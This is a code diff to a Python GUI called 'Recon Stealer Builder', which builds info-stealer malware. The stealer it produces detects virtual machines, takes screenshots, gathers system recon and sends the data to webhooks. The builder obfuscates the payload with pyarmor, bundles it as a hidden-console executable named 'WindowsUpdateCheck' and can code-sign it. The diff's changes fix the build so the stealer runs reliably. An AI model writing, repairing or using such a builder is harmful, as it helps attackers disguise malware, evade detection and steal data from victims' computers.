@@ -21,17 +21,16 @@ def test_webhook(hook):
     except Exception as e:
         return False, f"Error: {str(e)}"
 
-# =================== GUI ===================
+# =================== GUI (same as last, minor clarity tweaks) ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Recon Stealer Builder - Manual Pack Edition")
+    root.title("Recon Stealer Builder - Stdlib Import Fix Edition")
     root.geometry("800x600")
     root.resizable(False, False)
 
     notebook = ttk.Notebook(root)
     notebook.pack(fill="both", expand=True, padx=10, pady=10)
 
-    # Build Tab
     build_frame = ttk.Frame(notebook)
     notebook.add(build_frame, text="Build")
 
@@ -86,7 +85,7 @@ def get_webhook():
             generate_malware(webhooks, pfx_path, pfx_pass, mode)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe ready - clean onefile bundle, no extraction errors.\nScreenshot + recon + multi-exfil.")
+            messagebox.showinfo("Built", "stealer.exe ready - uuid + all stdlib imports fixed.\nRuns clean now.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -95,7 +94,6 @@ def get_webhook():
 
     ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)
 
-    # Info Tab (unchanged)
     info_frame = ttk.Frame(notebook)
     notebook.add(info_frame, text="Info / Licenses")
 
@@ -141,8 +139,6 @@ except:
     HAS_PYAUTO = False
 
 def is_vm():
-    # [same solid VM checks]
-
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
         val = winreg.QueryValueEx(key, "0")[0].lower()
@@ -265,7 +261,7 @@ Local IP      : {get_local_ip()}
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
-# =================== BUILD - Obf then manual PyInstaller ===================
+# =================== BUILD - Added all stdlib hidden-imports ===================
 def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     if not shutil.which("pyarmor"):
         raise Exception("pyarmor not installed")
@@ -278,7 +274,6 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
 
     obf_dir = os.path.join(temp_dir, "dist")
 
-    # Pyarmor obfuscate
     gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
     if mode == 1:
         gen_cmd += ["--advanced", "2", "--mix-str"]
@@ -288,23 +283,24 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
 
     result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
     if result.returncode != 0:
-        raise Exception(f"Pyarmor obf failed:\n{result.stderr}")
+        raise Exception(f"Pyarmor failed:\n{result.stderr}")
 
     obf_script = os.path.join(obf_dir, "recon.py")
 
-    # Manual PyInstaller onefile
+    # All the hidden imports we need for stdlib + extras
+    hidden_imports = [
+        "uuid", "ctypes", "socket", "winreg", "platform", "datetime", "random",
+        "subprocess", "os", "sys", "time", "requests", "pyautogui", "pyarmor_runtime"
+    ]
+    hidden_args = sum([["--hidden-import", mod] for mod in hidden_imports], [])
+
     pyi_cmd = [
         "pyinstaller",
         "--onefile",
         "--noconsole",
         "--clean",
         "--name", "WindowsUpdateCheck",
-        "--hidden-import", "pyarmor_runtime",
-        "--hidden-import", "pyautogui",
-        "--hidden-import", "winreg",
-        "--hidden-import", "requests",
-        obf_script
-    ]
+    ] + hidden_args + [obf_script]
 
     result = subprocess.run(pyi_cmd, cwd=temp_dir, capture_output=True, text=True)
     if result.returncode != 0:
@@ -314,7 +310,6 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     final = os.path.join(os.getcwd(), "stealer.exe")
     shutil.copyfile(bundled_exe, final)
 
-    # Signing
     if pfx_path and os.path.exists(pfx_path):
         sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
         if pfx_pass:
@@ -327,7 +322,7 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
             print("Signed.")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Solid onefile stealer built: {final}")
+    print(f"UUID-fixed stealer built: {final}")
 
 if __name__ == "__main__":
     get_webhook()
